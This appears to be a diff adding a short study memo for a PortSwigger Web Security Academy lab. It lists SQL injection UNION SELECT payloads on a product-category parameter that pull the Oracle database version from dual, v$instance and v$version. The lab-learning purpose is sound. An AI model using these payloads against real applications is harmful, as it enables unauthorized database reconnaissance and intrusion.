@@ -1,0 +1,11 @@
+# PortSwigger Web Security Academy - SQL Injection Attack memo
+# Get Oracel Version by SQL Injection Attack
+
+Accessories' union select 'abc', 'def' from dual --
+
+Accessories' union select version, 'def' from v$instance --
+
+// banner_full and banner_legacy available since Oracle Database Release 18c, version 18.1
+Accessories' union select banner_full, 'def' from v$version --
+
+Accessories' union select banner, 'def' from v$version --
